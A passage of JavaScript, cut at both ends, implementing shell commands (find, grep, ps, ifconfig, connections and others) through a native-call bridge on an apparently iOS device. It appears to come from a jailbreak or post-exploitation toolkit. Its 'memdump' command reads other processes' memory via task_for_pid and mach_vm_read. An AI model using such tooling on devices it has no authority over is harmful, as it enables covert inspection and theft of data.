	var st = _statFile(path);
	if (st) {
		Native.callSymbol("utimes", path, 0n);
	} else {
		var fd = Number(Native.callSymbol("open", path, 0x0601, 0x1a4));
		if (fd < 0) return { code: 1, out: "", err: "touch: " + path + ": Cannot create file\n" };
		Native.callSymbol("close", fd);
	}
	return { code: 0, out: "", err: "" };
}

function _cmdLn(args) {
	var sym = false, target = null, link = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-s") sym = true;
		else if (!target) target = args[i];
		else link = args[i];
	}
	if (!target || !link) return { code: 1, out: "", err: "ln: usage: ln [-s] target link\n" };
	var tgt = _resolvePath(target);
	var lnk = _resolvePath(link);
	var fn = sym ? "symlink" : "link";
	var r = Number(Native.callSymbol(fn, tgt, lnk));
	if (r !== 0) return { code: 1, out: "", err: "ln: " + lnk + ": Operation failed\n" };
	return { code: 0, out: "", err: "" };
}

function _cmdReadlink(args) {
	if (args.length < 2) return { code: 1, out: "", err: "readlink: missing operand\n" };
	var path = _resolvePath(args[1]);
	var buf = Native.callSymbol("malloc", 1024);
	if (!buf || buf === 0n) return { code: 1, out: "", err: "readlink: failed\n" };
	try {
		var len = Number(Native.callSymbol("readlink", path, buf, 1023));
		if (len <= 0) return { code: 1, out: "", err: "readlink: " + path + ": Invalid argument\n" };
		return { code: 0, out: Native.readString(buf, len) + "\n", err: "" };
	} finally { Native.callSymbol("free", buf); }
}

function _matchGlob(name, pattern) {
	if (!pattern) return true;
	if (pattern === "*") return true;
	if (pattern.indexOf('*') < 0 && pattern.indexOf('?') < 0) return name === pattern;
	var re = "^";
	for (var i = 0; i < pattern.length; i++) {
		var c = pattern.charAt(i);
		if (c === '*') re += ".*";
		else if (c === '?') re += ".";
		else if (".+^${}()|[]\\".indexOf(c) >= 0) re += "\\" + c;
		else re += c;
	}
	re += "$";
	try { return new RegExp(re).test(name); }
	catch(e) { return name.indexOf(pattern.replace(/\*/g, '')) >= 0; }
}

function _findRecursive(base, namePattern, typeFilter, results, depth, maxDepth) {
	if (depth > maxDepth || results.length > 10000) return;
	var items = listDir(base);
	for (var i = 0; i < items.length; i++) {
		var fp = base + (base === "/" ? "" : "/") + items[i].name;
		var isDir = items[i].type === "dir";
		var isFile = items[i].type === "file";
		if (typeFilter === "f" && !isFile) {
			if (isDir) _findRecursive(fp, namePattern, typeFilter, results, depth + 1, maxDepth);
			continue;
		}
		if (typeFilter === "d" && !isDir) continue;
		if (_matchGlob(items[i].name, namePattern)) results.push(fp);
		if (isDir) _findRecursive(fp, namePattern, typeFilter, results, depth + 1, maxDepth);
	}
}

function _cmdFind(args) {
	var searchPath = null, namePattern = null, typeFilter = null;
	var i = 1;
	while (i < args.length) {
		if (args[i] === "-name" && i + 1 < args.length) { namePattern = args[i + 1]; i += 2; }
		else if (args[i] === "-type" && i + 1 < args.length) { typeFilter = args[i + 1]; i += 2; }
		else if (args[i].charAt(0) !== '-') { searchPath = args[i]; i++; }
		else { i++; }
	}
	var path = _resolvePath(searchPath || ".");
	var results = [];
	_findRecursive(path, namePattern, typeFilter, results, 0, 20);
	return { code: 0, out: results.join("\n") + (results.length ? "\n" : ""), err: "" };
}

function _cmdHead(args) {
	var n = 10, file = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-n" && i + 1 < args.length) { n = parseInt(args[++i]); }
		else if (args[i].charAt(0) !== '-') file = args[i];
	}
	if (!file) return { code: 1, out: "", err: "head: missing operand\n" };
	var path = _resolvePath(file);
	var bytes = _readFileBytes(path);
	if (!bytes) return { code: 1, out: "", err: "head: " + path + ": No such file or directory\n" };
	var text = _rawToStr(bytes);
	var lines = text.split('\n');
	var out = lines.slice(0, n).join('\n');
	if (lines.length > n) out += '\n';
	return { code: 0, out: out, err: "" };
}

function _cmdTail(args) {
	var n = 10, file = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-n" && i + 1 < args.length) { n = parseInt(args[++i]); }
		else if (args[i].charAt(0) !== '-') file = args[i];
	}
	if (!file) return { code: 1, out: "", err: "tail: missing operand\n" };
	var path = _resolvePath(file);
	var bytes = _readFileBytes(path);
	if (!bytes) return { code: 1, out: "", err: "tail: " + path + ": No such file or directory\n" };
	var text = _rawToStr(bytes);
	var lines = text.split('\n');
	var start = lines.length > n ? lines.length - n : 0;
	return { code: 0, out: lines.slice(start).join('\n'), err: "" };
}

function _cmdWc(args) {
	var cntL = false, cntW = false, cntC = false, file = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i].charAt(0) === '-') {
			for (var j = 1; j < args[i].length; j++) {
				var ch = args[i].charAt(j);
				if (ch === 'l') cntL = true;
				if (ch === 'w') cntW = true;
				if (ch === 'c') cntC = true;
			}
		} else file = args[i];
	}
	if (!file) return { code: 1, out: "", err: "wc: missing operand\n" };
	if (!cntL && !cntW && !cntC) { cntL = true; cntW = true; cntC = true; }
	var path = _resolvePath(file);
	var bytes = _readFileBytes(path);
	if (!bytes) return { code: 1, out: "", err: "wc: " + path + ": No such file or directory\n" };
	var text = _rawToStr(bytes);
	var out = "";
	if (cntL) { var nl = 0; for (var k = 0; k < text.length; k++) if (text.charAt(k) === '\n') nl++; out += nl + "\t"; }
	if (cntW) {
		var wc = 0, inWord = false;
		for (var k = 0; k < text.length; k++) {
			var cc = text.charCodeAt(k);
			var ws = (cc === 32 || cc === 9 || cc === 10 || cc === 13);
			if (!ws && !inWord) { wc++; inWord = true; }
			if (ws) inWord = false;
		}
		out += wc + "\t";
	}
	if (cntC) out += bytes.length + "\t";
	out += path + "\n";
	return { code: 0, out: out, err: "" };
}

function _cmdGrep(args) {
	if (args.length < 3) return { code: 1, out: "", err: "grep: usage: grep pattern file\n" };
	var ignCase = false, lineNum = false;
	var pattern = null, file = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-i") ignCase = true;
		else if (args[i] === "-n") lineNum = true;
		else if (!pattern) pattern = args[i];
		else file = args[i];
	}
	if (!pattern || !file) return { code: 1, out: "", err: "grep: usage: grep [-in] pattern file\n" };
	var path = _resolvePath(file);
	var bytes = _readFileBytes(path);
	if (!bytes) return { code: 1, out: "", err: "grep: " + path + ": No such file or directory\n" };
	var text = _rawToStr(bytes);
	var lines = text.split('\n');
	var out = "";
	var found = false;
	var pat = ignCase ? pattern.toLowerCase() : pattern;
	for (var i = 0; i < lines.length; i++) {
		var line = ignCase ? lines[i].toLowerCase() : lines[i];
		if (line.indexOf(pat) >= 0) {
			out += (lineNum ? (i + 1) + ":" : "") + lines[i] + "\n";
			found = true;
		}
	}
	return { code: found ? 0 : 1, out: out, err: "" };
}

function _duRecursive(path, depth) {
	if (depth > 50) return 0;
	var st = _statFile(path);
	if (!st) return 0;
	if (st.isFile) return st.size;
	var total = 0;
	var items = listDir(path);
	for (var i = 0; i < items.length; i++) {
		total += _duRecursive(path + "/" + items[i].name, depth + 1);
	}
	return total;
}

function _cmdDu(args) {
	var summary = false, human = false, target = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-s") summary = true;
		else if (args[i] === "-h") human = true;
		else if (args[i].charAt(0) !== '-') target = args[i];
	}
	var path = _resolvePath(target || ".");
	var total = _duRecursive(path, 0);
	var sizeStr = human ? _fmtSizeH(total) : "" + (total / 1024 | 0);
	return { code: 0, out: sizeStr + "\t" + path + "\n", err: "" };
}

function _cmdFile(args) {
	if (args.length < 2) return { code: 1, out: "", err: "file: missing operand\n" };
	var path = _resolvePath(args[1]);
	var st = _statFile(path);
	if (!st) return { code: 1, out: "", err: "file: " + path + ": No such file or directory\n" };
	if (st.isDir) return { code: 0, out: path + ": directory\n", err: "" };
	if (st.isLink) return { code: 0, out: path + ": symbolic link\n", err: "" };
	var bytes = _readFileBytes(path, 512);
	if (!bytes || bytes.length === 0) return { code: 0, out: path + ": empty\n", err: "" };
	if (bytes.length >= 4) {
		if (bytes[0]===0xCF && bytes[1]===0xFA && bytes[2]===0xED && bytes[3]===0xFE) return { code: 0, out: path + ": Mach-O 64-bit executable\n", err: "" };
		if (bytes[0]===0xCA && bytes[1]===0xFE && bytes[2]===0xBA && bytes[3]===0xBE) return { code: 0, out: path + ": Mach-O universal binary\n", err: "" };
		if (bytes[0]===0x89 && bytes[1]===0x50 && bytes[2]===0x4E && bytes[3]===0x47) return { code: 0, out: path + ": PNG image data\n", err: "" };
		if (bytes[0]===0xFF && bytes[1]===0xD8 && bytes[2]===0xFF) return { code: 0, out: path + ": JPEG image data\n", err: "" };
		if (bytes[0]===0x50 && bytes[1]===0x4B && bytes[2]===0x03 && bytes[3]===0x04) return { code: 0, out: path + ": Zip archive\n", err: "" };
		if (bytes[0]===0x53 && bytes[1]===0x51 && bytes[2]===0x4C && bytes[3]===0x69) return { code: 0, out: path + ": SQLite 3.x database\n", err: "" };
		if (bytes[0]===0x62 && bytes[1]===0x70 && bytes[2]===0x6C && bytes[3]===0x69) return { code: 0, out: path + ": Apple binary property list\n", err: "" };
		if (bytes[0]===0x3C && bytes[1]===0x3F && bytes[2]===0x78 && bytes[3]===0x6D) return { code: 0, out: path + ": XML document\n", err: "" };
	}
	var isText = true;
	for (var i = 0; i < Math.min(bytes.length, 256); i++) {
		if (bytes[i] < 9 || (bytes[i] > 13 && bytes[i] < 32 && bytes[i] !== 27)) { isText = false; break; }
	}
	if (isText) return { code: 0, out: path + ": ASCII text\n", err: "" };
	return { code: 0, out: path + ": data\n", err: "" };
}

function _cmdHexdump(args) {
	var maxBytes = 256, file = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-n" && i + 1 < args.length) { maxBytes = parseInt(args[++i]); }
		else if (args[i].charAt(0) !== '-') file = args[i];
	}
	if (!file) return { code: 1, out: "", err: "hexdump: missing operand\n" };
	var path = _resolvePath(file);
	var bytes = _readFileBytes(path, maxBytes);
	if (!bytes) return { code: 1, out: "", err: "hexdump: " + path + ": No such file or directory\n" };
	var out = "";
	for (var i = 0; i < bytes.length; i += 16) {
		var addr = ("00000000" + i.toString(16)).slice(-8);
		var hex = "", ascii = "";
		for (var j = 0; j < 16; j++) {
			if (i + j < bytes.length) {
				hex += ("0" + bytes[i + j].toString(16)).slice(-2) + " ";
				ascii += (bytes[i + j] >= 32 && bytes[i + j] < 127) ? String.fromCharCode(bytes[i + j]) : ".";
			} else { hex += "   "; }
			if (j === 7) hex += " ";
		}
		out += addr + "  " + hex + " |" + ascii + "|\n";
	}
	return { code: 0, out: out, err: "" };
}

// ---- System Info Commands ----

function _cmdWhoami() {
	var uid = Number(Native.callSymbol("getuid"));
	return { code: 0, out: (uid === 0 ? "root" : "mobile") + "\n", err: "" };
}

function _cmdId() {
	var uid = Number(Native.callSymbol("getuid"));
	var gid = Number(Native.callSymbol("getgid"));
	var euid = Number(Native.callSymbol("geteuid"));
	var egid = Number(Native.callSymbol("getegid"));
	var uname = uid === 0 ? "root" : "mobile";
	var gname = gid === 0 ? "wheel" : gid === 501 ? "mobile" : "" + gid;
	var out = "uid=" + uid + "(" + uname + ") gid=" + gid + "(" + gname + ")";
	if (euid !== uid) out += " euid=" + euid;
	if (egid !== gid) out += " egid=" + egid;
	return { code: 0, out: out + "\n", err: "" };
}

function _cmdUname(args) {
	var all = false;
	for (var i = 1; i < args.length; i++) if (args[i] === "-a") all = true;
	var uts = Native.callSymbol("calloc", 1, 1536);
	if (!uts || uts === 0n) return { code: 1, out: "", err: "uname: failed\n" };
	try {
		Native.callSymbol("uname", uts);
		var sysname  = Native.readString(uts, 256).replace(/\0/g, "");
		var nodename = Native.readString(uts + 256n, 256).replace(/\0/g, "");
		var release  = Native.readString(uts + 512n, 256).replace(/\0/g, "");
		var version  = Native.readString(uts + 768n, 256).replace(/\0/g, "");
		var machine  = Native.readString(uts + 1024n, 256).replace(/\0/g, "");
		if (all) return { code: 0, out: sysname + " " + nodename + " " + release + " " + version + " " + machine + "\n", err: "" };
		return { code: 0, out: sysname + "\n", err: "" };
	} finally { Native.callSymbol("free", uts); }
}

function _cmdHostname() {
	var buf = Native.callSymbol("malloc", 256);
	if (!buf || buf === 0n) return { code: 1, out: "", err: "hostname: failed\n" };
	try {
		var r = Number(Native.callSymbol("gethostname", buf, 255));
		if (r !== 0) return { code: 1, out: "", err: "hostname: failed\n" };
		return { code: 0, out: Native.readString(buf, 256).replace(/\0/g, "") + "\n", err: "" };
	} finally { Native.callSymbol("free", buf); }
}

function _cmdDf(args) {
	var human = false;
	for (var i = 1; i < args.length; i++) if (args[i] === "-h") human = true;
	var sb = Native.callSymbol("calloc", 1, 4096);
	if (!sb || sb === 0n) return { code: 1, out: "", err: "df: failed\n" };
	try {
		var r = Number(Native.callSymbol("statfs", "/", sb));
		if (r !== 0) return { code: 1, out: "", err: "df: statfs failed\n" };
		var bsRaw = new DataView(Native.read(Native.asBigInt(sb), 4));
		var bsize  = bsRaw.getUint32(0, true);
		var blocks = Number(Native.readPtr(Native.asBigInt(sb) + 8n));
		var bfree  = Number(Native.readPtr(Native.asBigInt(sb) + 16n));
		var bavail = Number(Native.readPtr(Native.asBigInt(sb) + 24n));
		var total = blocks * bsize, free = bfree * bsize;
		var used = total - free, avail = bavail * bsize;
		var pct = total > 0 ? Math.round(used * 100 / total) : 0;
		var out = "Filesystem\tSize\tUsed\tAvail\tUse%\tMounted on\n";
		if (human) {
			out += "/dev/disk0s1\t" + _fmtSizeH(total) + "\t" + _fmtSizeH(used) + "\t" + _fmtSizeH(avail) + "\t" + pct + "%\t/\n";
		} else {
			out += "/dev/disk0s1\t" + (total/1024|0) + "\t" + (used/1024|0) + "\t" + (avail/1024|0) + "\t" + pct + "%\t/\n";
		}
		return { code: 0, out: out, err: "" };
	} finally { Native.callSymbol("free", sb); }
}

function _cmdDate() {
	var now = new Date();
	return { code: 0, out: now.toISOString().replace("T", " ").replace("Z", " UTC") + "\n", err: "" };
}

function _cmdEcho(args) {
	return { code: 0, out: args.slice(1).join(" ") + "\n", err: "" };
}

// ---- Process Commands ----

function _cmdPs(args) {
	var pidBufSize = 4 * 8192;
	var pidBuf = Native.callSymbol("malloc", Native.asBigInt(pidBufSize));
	if (!pidBuf || pidBuf === 0n) return { code: 1, out: "", err: "ps: malloc failed\n" };

	var count = Number(Native.callSymbol("proc_listallpids", pidBuf, pidBufSize));
	if (count <= 0) {
		Native.callSymbol("free", pidBuf);
		return { code: 1, out: "", err: "ps: proc_listallpids failed\n" };
	}
	if (count > 8192) count = 8192;

	var pids = [];
	for (var i = 0; i < count; i++) {
		var pid = Native.read32(Native.asBigInt(pidBuf) + Native.asBigInt(i * 4));
		if (pid > 0) pids.push(pid);
	}
	Native.callSymbol("free", pidBuf);
	pids.sort(function(a, b) { return a - b; });

	var nameBuf = Native.callSymbol("malloc", 256);
	if (!nameBuf || nameBuf === 0n) return { code: 1, out: "", err: "ps: malloc failed\n" };

	var out = "  PID\tNAME\n";
	for (var pi = 0; pi < pids.length; pi++) {
		try {
			Native.callSymbol("memset", nameBuf, 0, 256);
			var nameLen = Number(Native.callSymbol("proc_name", pids[pi], nameBuf, 255));
			var name = nameLen > 0 ? Native.readString(Native.asBigInt(nameBuf), 255) : "?";
			out += "  " + pids[pi] + "\t" + name + "\n";
		} catch (procErr) {
			out += "  " + pids[pi] + "\t(error)\n";
		}
	}
	Native.callSymbol("free", nameBuf);
	out += "\nTotal: " + pids.length + " processes\n";

	return { code: 0, out: out, err: "" };
}

function _cmdMemdump(args) {
	if (args.length < 4) return { code: 1, out: "", err: "memdump: usage: memdump <pid> <hex_address> <size>\n  Address in hex (0x...). Max dump display 4KB, max read 1MB.\n" };

	var pid = parseInt(args[1]);
	var addrStr = args[2];
	var address = (addrStr.indexOf("0x") === 0 || addrStr.indexOf("0X") === 0)
		? parseInt(addrStr, 16) : parseInt(addrStr);
	var size = parseInt(args[3]);

	if (isNaN(pid) || pid <= 0) return { code: 1, out: "", err: "memdump: invalid pid\n" };
	if (isNaN(address)) return { code: 1, out: "", err: "memdump: invalid address\n" };
	if (isNaN(size) || size <= 0) return { code: 1, out: "", err: "memdump: invalid size\n" };
	if (size > 1024 * 1024) return { code: 1, out: "", err: "memdump: size too large (max 1MB)\n" };

	var selfPortAddr = Native.callSymbol("dlsym", 0xfffffffffffffffen, "mach_task_self_");
	if (!selfPortAddr || selfPortAddr === 0n) return { code: 1, out: "", err: "memdump: cannot resolve mach_task_self_\n" };
	var selfPort = Native.read32(Native.asBigInt(selfPortAddr));

	var taskPtr = Native.callSymbol("calloc", 1, 8);
	if (!taskPtr || taskPtr === 0n) return { code: 1, out: "", err: "memdump: malloc failed\n" };

	var kr = Number(Native.callSymbol("task_for_pid", selfPort, pid, taskPtr));
	if (kr !== 0) {
		Native.callSymbol("free", taskPtr);
		return { code: 1, out: "", err: "memdump: task_for_pid failed (kern_return=" + kr + ")\n" };
	}
	var task = Native.read32(Native.asBigInt(taskPtr));
	Native.callSymbol("free", taskPtr);

	var dataOutPtr = Native.callSymbol("calloc", 1, 8);
	var cntOutPtr = Native.callSymbol("calloc", 1, 4);
	if (!dataOutPtr || dataOutPtr === 0n || !cntOutPtr || cntOutPtr === 0n) {
		Native.callSymbol("mach_port_deallocate", selfPort, task);
		if (dataOutPtr) Native.callSymbol("free", dataOutPtr);
		if (cntOutPtr) Native.callSymbol("free", cntOutPtr);
		return { code: 1, out: "", err: "memdump: malloc failed\n" };
	}

	kr = Number(Native.callSymbol("mach_vm_read", task, Native.asBigInt(address), Native.asBigInt(size), dataOutPtr, cntOutPtr));
	if (kr !== 0) {
		Native.callSymbol("free", dataOutPtr);
		Native.callSymbol("free", cntOutPtr);
		Native.callSymbol("mach_port_deallocate", selfPort, task);
		return { code: 1, out: "", err: "memdump: mach_vm_read failed (kern_return=" + kr + ")\n" };
	}

	var dataAddr = Native.readPtr(Native.asBigInt(dataOutPtr));
	var dataCnt = _readU32(Native.asBigInt(cntOutPtr), 0);
	Native.callSymbol("free", dataOutPtr);
	Native.callSymbol("free", cntOutPtr);

	var readSize = dataCnt < size ? dataCnt : size;
	var bytes = new Uint8Array(Native.read(dataAddr, readSize));

	Native.callSymbol("mach_vm_deallocate", selfPort, dataAddr, Native.asBigInt(dataCnt));
	Native.callSymbol("mach_port_deallocate", selfPort, task);

	var maxShow = readSize > 4096 ? 4096 : readSize;
	var out = "";
	for (var i = 0; i < maxShow; i += 16) {
		var a = (address + i).toString(16);
		while (a.length < 8) a = "0" + a;
		var hex = "", ascii = "";
		for (var j = 0; j < 16; j++) {
			if (i + j < maxShow) {
				var hx = bytes[i + j].toString(16);
				hex += (hx.length < 2 ? "0" + hx : hx) + " ";
				ascii += (bytes[i + j] >= 32 && bytes[i + j] < 127) ? String.fromCharCode(bytes[i + j]) : ".";
			} else { hex += "   "; }
			if (j === 7) hex += " ";
		}
		out += a + "  " + hex + " |" + ascii + "|\n";
	}
	if (readSize > maxShow) out += "\n... truncated (read " + readSize + " bytes, showing " + maxShow + ")\n";
	out += "\n" + readSize + " bytes read from pid " + pid + " at 0x" + address.toString(16) + "\n";

	return { code: 0, out: out, err: "" };
}

// ---- Network Commands ----

function _cmdIfconfig(args) {
	var ifapPtr = Native.callSymbol("calloc", 1, 8);
	if (!ifapPtr || ifapPtr === 0n) return { code: 1, out: "", err: "ifconfig: malloc failed\n" };

	var r = Number(Native.callSymbol("getifaddrs", ifapPtr));
	if (r !== 0) {
		Native.callSymbol("free", ifapPtr);
		return { code: 1, out: "", err: "ifconfig: getifaddrs failed\n" };
	}

	var ifaHead = Native.readPtr(Native.asBigInt(ifapPtr));
	Native.callSymbol("free", ifapPtr);
	if (!ifaHead || ifaHead === 0n) return { code: 0, out: "(no interfaces)\n", err: "" };

	var ifMap = {};
	var ifOrder = [];
	var ifa = ifaHead;
	var maxIter = 1024;

	while (ifa && ifa !== 0n && maxIter-- > 0) {
		try {
			var namePtr = Native.readPtr(ifa + 8n);
			var name = (namePtr && namePtr !== 0n) ? Native.readString(namePtr, 32) : "?";
			var flags = _readU32(ifa, 16);
			var addrPtr = Native.readPtr(ifa + 24n);

			if (!ifMap[name]) {
				ifMap[name] = { flags: flags, addrs: [], mtu: 0 };
				ifOrder.push(name);
			}

			if (addrPtr && addrPtr !== 0n) {
				var family = _readU8(addrPtr, 1);

				if (family === 2) {
					var ab = new Uint8Array(Native.read(addrPtr + 4n, 4));
					var ip = ab[0] + "." + ab[1] + "." + ab[2] + "." + ab[3];
					var entry = { type: "inet", addr: ip };
					var maskPtr = Native.readPtr(ifa + 32n);
					if (maskPtr && maskPtr !== 0n) {
						var mb = new Uint8Array(Native.read(maskPtr + 4n, 4));
						entry.mask = mb[0] + "." + mb[1] + "." + mb[2] + "." + mb[3];
					}
					ifMap[name].addrs.push(entry);
				} else if (family === 30) {
					var a6 = new Uint8Array(Native.read(addrPtr + 8n, 16));
					var v6 = "";
					for (var k = 0; k < 16; k += 2) {
						if (k > 0) v6 += ":";
						v6 += ((a6[k] << 8) | a6[k + 1]).toString(16);
					}
					ifMap[name].addrs.push({ type: "inet6", addr: v6 });
				} else if (family === 18) {
					var dataPtr = Native.readPtr(ifa + 48n);
					if (dataPtr && dataPtr !== 0n) {
						ifMap[name].mtu = _readU32(dataPtr, 8);
					}
				}
			}
		} catch (iterErr) { /* skip this entry on error */ }

		ifa = Native.readPtr(ifa);
	}

	Native.callSymbol("freeifaddrs", ifaHead);

	var out = "";
	for (var oi = 0; oi < ifOrder.length; oi++) {
		var n = ifOrder[oi];
		var inf = ifMap[n];
		var fl = [];
		if (inf.flags & 0x1) fl.push("UP");
		if (inf.flags & 0x2) fl.push("BROADCAST");
		if (inf.flags & 0x8) fl.push("LOOPBACK");
		if (inf.flags & 0x10) fl.push("POINTOPOINT");
		if (inf.flags & 0x40) fl.push("RUNNING");
		if (inf.flags & 0x8000) fl.push("MULTICAST");
		out += n + ": flags=0x" + inf.flags.toString(16) + " <" + fl.join(",") + ">";
		if (inf.mtu > 0) out += " mtu " + inf.mtu;
		out += "\n";
		for (var ai = 0; ai < inf.addrs.length; ai++) {
			var ad = inf.addrs[ai];
			if (ad.type === "inet") {
				out += "\tinet " + ad.addr;
				if (ad.mask) out += " netmask " + ad.mask;
				out += "\n";
			} else if (ad.type === "inet6") {
				out += "\tinet6 " + ad.addr + "\n";
			}
		}
	}

	return { code: 0, out: out, err: "" };
}

function _cmdNetstats(args) {
	var ifapPtr = Native.callSymbol("calloc", 1, 8);
	if (!ifapPtr || ifapPtr === 0n) return { code: 1, out: "", err: "netstats: malloc failed\n" };

	var r = Number(Native.callSymbol("getifaddrs", ifapPtr));
	if (r !== 0) {
		Native.callSymbol("free", ifapPtr);
		return { code: 1, out: "", err: "netstats: getifaddrs failed\n" };
	}

	var ifaHead = Native.readPtr(Native.asBigInt(ifapPtr));
	Native.callSymbol("free", ifapPtr);
	if (!ifaHead || ifaHead === 0n) return { code: 0, out: "(no interfaces)\n", err: "" };

	var stats = {};
	var order = [];
	var ifa = ifaHead;
	var maxIter = 1024;

	while (ifa && ifa !== 0n && maxIter-- > 0) {
		try {
			var namePtr = Native.readPtr(ifa + 8n);
			var name = (namePtr && namePtr !== 0n) ? Native.readString(namePtr, 32) : "?";
			var addrPtr = Native.readPtr(ifa + 24n);

			if (addrPtr && addrPtr !== 0n) {
				var family = _readU8(addrPtr, 1);
				if (family === 18) {
					var dataPtr = Native.readPtr(ifa + 48n);
					if (dataPtr && dataPtr !== 0n) {
						if (!stats[name]) order.push(name);
						stats[name] = {
							mtu: _readU32(dataPtr, 8),
							ipackets: _readU32(dataPtr, 20),
							ierrors: _readU32(dataPtr, 24),
							opackets: _readU32(dataPtr, 28),
							oerrors: _readU32(dataPtr, 32),
							collisions: _readU32(dataPtr, 36),
							ibytes: _readU32(dataPtr, 40),
							obytes: _readU32(dataPtr, 44)
						};
					}
				}
			}
		} catch (iterErr) { /* skip on error */ }

		ifa = Native.readPtr(ifa);
	}

	Native.callSymbol("freeifaddrs", ifaHead);

	var out = "Interface\tRX bytes\tTX bytes\tRX pkts\t\tTX pkts\t\tRX err\tTX err\n";
	var totalRx = 0, totalTx = 0;
	for (var si = 0; si < order.length; si++) {
		var sn = order[si];
		var s = stats[sn];
		out += sn + "\t\t" + _fmtSizeH(s.ibytes) + "\t\t" + _fmtSizeH(s.obytes)
			+ "\t\t" + s.ipackets + "\t\t" + s.opackets
			+ "\t\t" + s.ierrors + "\t" + s.oerrors + "\n";
		totalRx += s.ibytes;
		totalTx += s.obytes;
	}
	out += "\nTotal RX: " + _fmtSizeH(totalRx) + "  TX: " + _fmtSizeH(totalTx) + "\n";

	out += "\nNetwork type summary:\n";
	for (var ni = 0; ni < order.length; ni++) {
		var nn = order[ni];
		var ns = stats[nn];
		if (ns.ibytes === 0 && ns.obytes === 0) continue;
		var netType = "other";
		if (nn === "en0") netType = "WiFi";
		else if (nn === "lo0") netType = "Loopback";
		else if (nn.indexOf("pdp_ip") === 0) netType = "Cellular";
		else if (nn.indexOf("utun") === 0) netType = "VPN/Tunnel";
		else if (nn.indexOf("ipsec") === 0) netType = "IPSec";
		else if (nn.indexOf("en") === 0) netType = "Ethernet";
		else if (nn.indexOf("awdl") === 0) netType = "AWDL (AirDrop)";
		out += "  " + nn + " (" + netType + "): RX " + _fmtSizeH(ns.ibytes) + " / TX " + _fmtSizeH(ns.obytes) + "\n";
	}

	return { code: 0, out: out, err: "" };
}

// ---- Network Connection Commands ----

function _fmtIPv6Short(data, off) {
	var parts = [];
	for (var i = 0; i < 16; i += 2) {
		parts.push(((data[off + i] << 8) | data[off + i + 1]).toString(16));
	}
	return parts.join(":");
}

function _getSysctlPcbList(name) {
	var sizePtr = Native.callSymbol("calloc", 1, 8);
	if (!sizePtr || sizePtr === 0n) return null;

	var rc = Number(Native.callSymbol("sysctlbyname", name, 0, sizePtr, 0, 0));
	if (rc !== 0) { Native.callSymbol("free", sizePtr); return null; }

	var dataSize = Number(Native.readPtr(Native.asBigInt(sizePtr)));
	if (dataSize <= 0 || dataSize > 10 * 1024 * 1024) { Native.callSymbol("free", sizePtr); return null; }

	var allocSize = dataSize + 4096;
	var dataBuf = Native.callSymbol("malloc", Native.asBigInt(allocSize));
	if (!dataBuf || dataBuf === 0n) { Native.callSymbol("free", sizePtr); return null; }

	Native.write64(sizePtr, Native.asBigInt(allocSize));
	rc = Number(Native.callSymbol("sysctlbyname", name, dataBuf, sizePtr, 0, 0));
	var actualSize = Number(Native.readPtr(Native.asBigInt(sizePtr)));
	Native.callSymbol("free", sizePtr);

	if (rc !== 0) { Native.callSymbol("free", dataBuf); return null; }
	return { buf: dataBuf, size: actualSize };
}

function _parseConnections(dataBuf, dataSize, isTcp) {
	var XSO_INPCB = 0x010, XSO_TCPCB = 0x020;
	var conns = [];

	if (dataSize < 24) return conns;
	var headerLen = _readU32(dataBuf, 0);
	if (headerLen < 16 || headerLen > 256) return conns;

	var off = headerLen;
	var cur = null;
	var maxIter = 50000;

	while (off + 8 <= dataSize && maxIter-- > 0) {
		var eLen = _readU32(dataBuf, off);
		var eKind = _readU32(dataBuf, off + 4);
		if (eLen < 8 || eLen > 8192 || off + eLen > dataSize) break;

		try {
			if (isTcp && eKind === XSO_TCPCB) {
				if (cur) conns.push(cur);
				cur = { state: -1, laddr: "", faddr: "", lport: 0, fport: 0, vflag: 0 };
				if (eLen >= 40) cur.state = _readU32(dataBuf, off + 36);
			} else if (eKind === XSO_INPCB) {
				if (!isTcp) {
					if (cur) conns.push(cur);
					cur = { state: -1, laddr: "", faddr: "", lport: 0, fport: 0, vflag: 0 };
				}
				if (cur && eLen >= 84) {
					cur.fport = (_readU8(dataBuf, off + 16) << 8) | _readU8(dataBuf, off + 17);
					cur.lport = (_readU8(dataBuf, off + 18) << 8) | _readU8(dataBuf, off + 19);
					cur.vflag = _readU8(dataBuf, off + 48);

					if (cur.vflag & 1) {
						var la = new Uint8Array(Native.read(dataBuf + Native.asBigInt(off + 64), 4));
						var fa = new Uint8Array(Native.read(dataBuf + Native.asBigInt(off + 80), 4));
						cur.laddr = la[0] + "." + la[1] + "." + la[2] + "." + la[3];
						cur.faddr = fa[0] + "." + fa[1] + "." + fa[2] + "." + fa[3];
					} else if (cur.vflag & 2) {
						var la6 = new Uint8Array(Native.read(dataBuf + Native.asBigInt(off + 52), 16));
						var fa6 = new Uint8Array(Native.read(dataBuf + Native.asBigInt(off + 68), 16));
						cur.laddr = _fmtIPv6Short(la6, 0);
						cur.faddr = _fmtIPv6Short(fa6, 0);
					}
				}
			}
		} catch (parseErr) { /* skip malformed entry */ }

		off += eLen;
	}
	if (cur) conns.push(cur);
	return conns;
}

function _cmdConnections(args) {
	var showTcp = true, showUdp = true, showListen = false, showAll = false;

	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-t") { showTcp = true; showUdp = false; }
		else if (args[i] === "-u") { showTcp = false; showUdp = true; }
		else if (args[i] === "-a") showAll = true;
		else if (args[i] === "-l") showListen = true;
		else if (args[i] === "-h" || args[i] === "--help") {
			return { code: 0, out:
				"Usage: connections [-t] [-u] [-a] [-l]\n" +
				"  -t         Show TCP connections only\n" +
				"  -u         Show UDP sockets only\n" +
				"  -a         Show all (including LISTEN, TIME_WAIT, CLOSED)\n" +
				"  -l         Show only LISTEN sockets\n" +
				"  Default: show TCP+UDP, hide LISTEN/TIME_WAIT/CLOSED\n", err: "" };
		}
	}

	var tcpStates = ["CLOSED", "LISTEN", "SYN_SENT", "SYN_RCVD", "ESTABLISHED",
		"CLOSE_WAIT", "FIN_WAIT_1", "CLOSING", "LAST_ACK", "FIN_WAIT_2", "TIME_WAIT"];

	var out = "Proto  Local Address                Foreign Address              State\n";
	out += "-----  -------------------------    -------------------------    -----------\n";
	var total = 0;

	if (showTcp) {
		var tcpData = _getSysctlPcbList("net.inet.tcp.pcblist_n");
		if (tcpData) {
